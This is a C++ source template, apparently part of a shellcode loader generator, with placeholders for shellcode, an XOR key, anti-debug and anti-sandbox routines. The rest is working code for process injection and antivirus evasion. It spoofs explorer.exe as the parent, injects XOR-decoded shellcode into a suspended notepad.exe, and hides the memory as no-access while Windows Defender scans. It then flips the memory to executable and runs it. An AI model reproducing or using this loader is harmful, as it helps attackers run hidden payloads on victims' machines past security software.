#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <iostream>
#include <TlHelp32.h>
#include "helper.h"

<SHELLCODE>

char key[] = <XOR_KEY>;
unsigned int key_len = sizeof(key);
unsigned int shellcode_len = sizeof(shellcode);


void zero_memory(unsigned char data[], int dataLen)
{
	for (int i = 0; i < dataLen; i++)
	{
		data[i] = '\00';
	}
}


<ANTI_DEBUG>

<ANTI_SANDBOX>

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPWSTR    lpCmdLine,
    _In_ int       nCmdShow)
{
	void* payloadPtr = nullptr;
	HANDLE ph;
	BOOL rv;
	HANDLE th;
	DWORD oldProtect = 0;
    CREATEPROCESSA createProcessA;
    OPENPROCESS openProcess;
    VIRTUALALLOCEX virtualAllocEx;
    WRITEPROCESSMEMORY writeProcessMemory;
    VIRTUALPROTECTEX virtualProtectEx;
    CREATEREMOTETHREAD createRemoteThread;
    RESUMETHREAD resumeThread;

	// Anti debug check
    antiDebug();

	// Anti sandbox check
    antiSandbox();

    <LOAD_FUNCTIONS>

    // PPID Spoofing
    // Initialize vars
    STARTUPINFOEXA si;
	PROCESS_INFORMATION pi;
	SIZE_T attributeSize;
	ZeroMemory(&si, sizeof(STARTUPINFOEXA));

    // Grab the PID for explorer.exe and get a handle to the process
    DWORD targetPid = getPidByName(L"explorer.exe");
    HANDLE parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, false, targetPid);

    // Mess with the attributes
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
	InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
	UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle, sizeof(HANDLE), NULL, NULL);
	si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	// Spawn process to inject into
	createProcessA(NULL, (LPSTR)"C:\\Windows\\System32\\notepad.exe", NULL, NULL, TRUE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
	

	//CreateProcessA(NULL, (LPSTR)"C:\\Windows\\System32\\notepad.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	ph = openProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId);


	// XOR shellcode
	xor_data(shellcode, shellcode_len, key, key_len);
	// Allocate memory to write payload into memory
    //	payloadPtr = VirtualAlloc(0, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);


	payloadPtr = virtualAllocEx(ph, NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	// Copy payload to memory
	//RtlMoveMemory(payloadPtr, shellcode.data, sz);
	writeProcessMemory(ph, payloadPtr, shellcode, shellcode_len, NULL);
	//zero_memory(shellcode, shellcode_len);
    xor_data(shellcode, shellcode_len, key, key_len);

	// Change memory permissions to PAGE_NO_ACCESS
	virtualProtectEx(ph, payloadPtr, shellcode_len, PAGE_NOACCESS, &oldProtect);

	// Create the thread in a suspended state to force Windows to scan it and fail due to NO_ACCESS
	th = createRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)payloadPtr, NULL, CREATE_SUSPENDED, NULL);
	
	//rv = VirtualProtect(payloadPtr, sz, PAGE_EXECUTE_READ, &oldProtect);

	// Sleep while Windows defender tries its best to scan it
	Sleep(30000);

	virtualProtectEx(ph, payloadPtr, shellcode_len, PAGE_EXECUTE_READ, &oldProtect);

	resumeThread(th);

	return 0;
}